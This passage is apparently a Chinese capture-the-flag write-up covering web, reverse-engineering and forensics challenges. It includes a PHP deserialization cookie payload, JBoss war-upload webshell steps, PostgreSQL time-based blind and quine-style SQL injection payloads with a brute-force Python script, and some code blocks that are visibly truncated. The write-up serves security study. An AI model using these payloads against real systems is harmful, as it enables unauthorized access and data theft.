    .ant文件 
    参考：https://blog.csdn.net/weixin_43999372/article/details/88364032
    jboss4.x漏洞
上传war包到`upload/xxx`
解析生成jsp马上传 root getshell读flag
### 0x06 **WhereIsUWebShell**
cookie参数反序列化：
`O:7:"myclass":2:{s:5:"hello";O:5:"Hello":1:{s:3:"qwb";s:36:"e2a7106f1cc8bb1e1318df70aa0a3540.php";}}`
需要url编码 需要根据读取文件名修改s:后的长度，实现任意文件读取。
    //e2a7106f1cc8bb1e1318df70aa0a3540.php
    //bff139fa05ac583f685a523ab3d110a0.php
     0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            imagepng($second, $file);
            imagedestroy($second);//销毁，清内存
        }
        imagedestroy($first);
    }
    ?>
    //45b963397aa40d4a0063e0d85e4fe7a1.php
发现可以任意文件读取（实际上只在两个有权限的地方/tmp和/var/www/html/下可以），可以获得文件夹下文件名。
这里是一个gd2的图片马，网上抄个脚本就可以了。
PNG函数猜测是一个文件上传入口
存在include包含。发现一个问题频繁的上传文件会导致502报错，但是tmp目录下的文件将会保留。但是，还有`php://filter/string.strip_tags/resource=passwd`这个是php7.x版本的漏洞包含溢出
还有一个suid提权，和flag的寻找。
​
###  0x07 easy_sql
username 的trick绕过 `username[]=admin`
下面就是绕过密码的校验，
然后这个题目 是postgrepsql数据库。使用以下脚本可以获取相关数据
    0'and(select/**/case/**/when(substr((select version()),{i},1)='{char}')then(SELECT/**/'dem0'/**/FROM/**/PG_SLEEP(5))else/**/'0'/**/end)='dem0';--    
信息如下:
    #database app
    #table users hint
    #hint 内容 its "nothing"
    #version PostgreSgreSQL 10.17
这里是后面爆破的信息不齐全
后面一半的hint和version没有爆破完全。然后发现user库是空的。那就只能我自己查我自己，然后我说是我自己密码正确，但是password注入了
还怎么相等呢？题目没有原型链，那就只有sql了。要达到的效果就是`SQL 查询语句和 SQL 查询结果完全相等。`因为是三个等号
借鉴:
    ' UNION SELECT REPLACE(REPLACE('" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS cid, 1337 AS passcode -- "OR 1 limit 3,1#',CHAR(34),CHAR(39)),CHAR(36),'" UNION SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS cid, 1337 AS passcode -- "OR 1 limit 3,1#') AS cid, 1337 AS passcode -- 'OR 1 limit 3,1#
他的本质可以理解循环嵌套了两层，用了两个replace，最后又来一遍。
作为标准开始写我们自己的。
replace可以用下面这个函数
    ' union SELECT REPLACE(REPLACE(' union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS dem0-- ',CHAR(34),CHAR(39)),CHAR(36),'union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS dem0') AS dem0--    
因为要绕过滤。本地跑一下就知道这个语句发现 我们没有char和replace。将各自他们在这里起的作用进行调试 把三个特殊字符 `'`
`"``.`处理一下。
然后
    ' union SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS dem0-- ',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS dem0-- ') AS dem0--    
首先char(36)和char(39)就不用问怎么绕过了把
(hint都给了)，借助hint，然后发现还有个`$`首先我们要明白这个`$`有什么作用，首先它的作用就是占位，也就是蹲坑。那么我们可以同样使用没有出现过的字符代替`.`这样就能达到相同的结果.
我们将源语句提取出来
     ' union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0--    
然后开始套娃
    f"""' union SELECT REPLACE(translate('" union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0-- ',(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),'" union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0-- ') AS dem0-- """
注意前面的`'` 还有空格。贴上一个脚本 方便测试
    import sys
    import time as t
    import string as s
    import requests as req
    url= ""
    payloads = s.printable
    res = ''
    #database app
    #table users
    #its "nothing"
    #version PostgreSgreSQL 10.17
    for i in range(5,50):
        for char in payloads:
            #payload = f"""0'and(select/**/case/**/when(substr((select version()),{i},1)='{char}')then(SELECT/**/'dem0'/**/FROM/**/PG_SLEEP(5))else/**/'0'/**/end)='dem0';--"""
            payload = f"""' union SELECT REPLACE(translate('" union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0-- ',(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),'" union SELECT REPLACE(translate(".",(select substr((select hint from hint),6,1)),(select substr((select hint from hint),3,1))),(select substr((select version()),14,1)),".") AS dem0-- ') AS dem0-- """
            data = {
                'username[]' : 'admin',
                'password' : payload,
            }
            try:
                print(payload)
                start = int(t.time())
                r = req.post(url=url, data=data)
                print(r.text)
                time = int(t.time()) - start
                if time >= 2:
                    res += char
                    print(res) 
                    break
            except Exception as e:
                print(e)
                pass
## RE
### 0x01 **ezmath**
因为精度不够，采用夹逼法求爆破flag
    #include
    #include
    using namespace std;
    unsigned char dbl_4020[] =
    {
      0x39, 0xCA, 0x59, 0xBD, 0x3F, 0xAD, 0x19, 0x3F, 0x95, 0xCA,
      0x21, 0x10, 0x63, 0xEC, 0x1A, 0x3F, 0xA1, 0xFF, 0xF2, 0x2D,
      0x29, 0x1A, 0x18, 0x3F, 0x9E, 0x12, 0x72, 0xF8, 0x06, 0x95,
      0x1C, 0x3F, 0x3A, 0xB4, 0xA9, 0xAB, 0xC6, 0x2A, 0x1D, 0x3F,
      0xA2, 0xBA, 0x40, 0x57, 0xD5, 0x68, 0x1A, 0x3F, 0x3A, 0xB4,
      0xA9, 0xAB, 0xC6, 0x2A, 0x1D, 0x3F, 0xFB, 0x48, 0xC4, 0x94,
      0xB9, 0x72, 0x1B, 0x3F, 0x14, 0xEC, 0x18, 0xAF, 0xFF, 0x2B,
      0x1D, 0x3F, 0x7D, 0xF7, 0x73, 0x32, 0x5F, 0x71, 0x1B, 0x3F,
      0x14, 0xEC, 0x18, 0xAF, 0xFF, 0x2B, 0x1D, 0x3F, 0x43, 0x06,
      0xCE, 0x02, 0x63, 0x92, 0x1C, 0x3F, 0x3A, 0xB4, 0xA9, 0xAB,
      0xC6, 0x2A, 0x1D, 0x3F, 0x06, 0x02, 0x10, 0xB7, 0x70, 0x94,
      0x1C, 0x3F, 0x53, 0x04, 0xB9, 0x04, 0x72, 0x2E, 0x1D, 0x3F,
      0x35, 0xCB, 0x77, 0xB1, 0x13, 0x65, 0x1A, 0x3F, 0x56, 0x6D,
      0xE7, 0x6E, 0x78, 0x2A, 0x1D, 0x3F, 0x82, 0x63, 0x2D, 0xDD,
      0xCC, 0x91, 0x1C, 0x3F, 0x33, 0xC1, 0xAA, 0x74, 0x11, 0x33,
      0x16, 0x3F
    };
    unsigned char constant[] = {
        0x69, 0x57, 0x14, 0x8B, 0x0A, 0xBF, 0x05, 0x40
    };
    double v3;
    BYTE v4[] = { 0xe9, 0x4, 0xf0, 0x7, 0x8, 0xa8, 0x35, 0x3f };
    void main()
    {
        double e = *(double*)constant;
        for (size_t j = 0; j 
    using namespace std;
    vectoradd,cut;
    int lena;
    string Enc;
    string Ori;
    string New;
    void dfs(string s,int index){
    if(index == lena - 1){
    cout<<(s+'=')<<endl;
    return ;
        }
    string tmp;
    if(Enc[index] == '+'){
    tmp = s+Ori[add[0]];
    dfs(tmp,index+1);
    tmp = s+Ori[add[1]];
    dfs(tmp,index+1);
        }
    else if(Enc[index] == '-'){
    tmp = s + Ori[cut[0]];
    dfs(tmp,index+1);
    tmp = s + Ori[cut[1]];
    dfs(tmp,index+1);
        }
    else{
    tmp = s + Ori[New.find(Enc[index])]; 
    dfs(tmp,index+1);
        }
    return ;
    }
    int main(){
    freopen("res.txt","w",stdout);
    Enc = "bUloKWheCJ-vVFhAr;ARxjfbiTSBXbJVorm;;cBzcLA+ZSW+@TM@LuIYyxW,vP/,HdlB;Kl+GKPmQfAqCjPlD;UYjoeI-scAjQEb-g-UcxEDmm@tqTKxqWsmTi-Zydv+GMCktXPHvmG=";
    Ori = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    New = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ*+,-./:;?@+-";
    for(int i=0;i<(int)New.length();i++){
    if(New[i] == '+') add.push_back(i);
    else if(New[i] == '-') cut.push_back(i);
        }
    lena = Enc.length();
    string tmp="";
    dfs(tmp,0);
    return 0;
    }
通过n分解出p，q，e为0x10001，遍历所有base64可能，并rsa解密，直到找到含有flag字样的语句
    from binascii import unhexlify
    from base64 import b64decode
    from gmpy2 import *
    from Crypto.Util.number import *
    table = "0C 0E 0F 0C 79 0F 7B 79 79 79 78 05 7F 79 04 79 7B 7B 0E 0A 04 7C 7B 7B 0D 0E 0D 79 78 0F 0D 08 7F 05 09 0B 78 7F 08 7E 78 7E 7E 09 0D 7B 7C 05 7C 7C 04 7E 0F 7C 05 08 7E 78 0E 78 04 04 0F 0C 04 0E 78 05 0A 0E 7F 0F 7F 7E 0B 0B 0A 79 7C 7F 78 0F 7C 7E 0E 78 78 04 79 79 0F 0E 7F 0E 7C 04 78 79 04 78 7E 0D 7E 0E 7E 0A 09 09 08 0B 0B 0E 7B 08 09 08 08 09 0B 04 7F 0A 0F 0A 79 79 0B 7B 7F 7E 0D 0E 7F 0C 7F 7B 04 08 79 0D 0E 7C 0C 0E 7E 0D 0E 0B 05 0B 09 08 0A 0B 0A 0B 0E 0D 7E 0A 78 7C 7F 7B 08 78 0A 7C 7F 08 7B 7C 0F 0A 7F 04 09 7C 79 78 0A 78 0C 78 0F 0E 7F 7E 7E 0B 08 79 0F 7C 0A 79 78 79 0C 7E 08 7F 0E 0B 09 7F 08 0C 3D".split(' ')
    table = [int(i, 16) for i in table]
    for i in range(len(table)):
        table[i] ^= 0x3D
    a = ''.join(map(lambda x:"%02X" % x, table))
    a = unhexlify(a).strip(b'\x00').decode()
    with open("res.txt") as f:
        res = f.read().split('\n')
    n = int(a, 16)
    p = 33372027594978156556226010605355114227940760344767554666784520987023841729210037080257448673296881877565718986258036932062711
    q = 64135289477071580278790190170577389084825014742943447208116859632024532344630238623598752668347708737661925585694639798853367
    e = 0x10001
    phi = (p-1) * (q-1)
    d = invert(e, phi)
    for i in res:
        try:
            c = bytes_to_long(b64decode(i))
            tmp = long_to_bytes(pow(c, d, n))
            if b'flag' in tmp or b'qwb' in tmp or b'ctf' in tmp or b'FLAG' in tmp or b'QWB' in tmp:
                print(tmp.decode())
        except:
            pass
## MISC
### 0x01 **cipherman**
volatility 查看memery，直接搜索txt文件
发现下面的文件
Device\HarddiskVolume2\Users\RockAndRoll\Desktop\BitLocker 복구 키
168F1291-82C1-4BF2-B634-9CCCEC63E9ED.txt
打开翻译
    BitLocker 드라이브 암호화 복구 키 
     복구 키는 BitLocker로 보호되는 드라이브에서 데이터를 검색하기 위해 사용됩니다.
    이 키가 올바른 복구 키인지 확인하려면 복구 화면에 표시된 것과 ID를 비교하십시오.
    복구 키 ID: 168F1291-82C1-4B
    전체 복구 키 ID: 168F1291-82C1-4BF2-B634-9CCCEC63E9ED
    BitLocker 복구 키: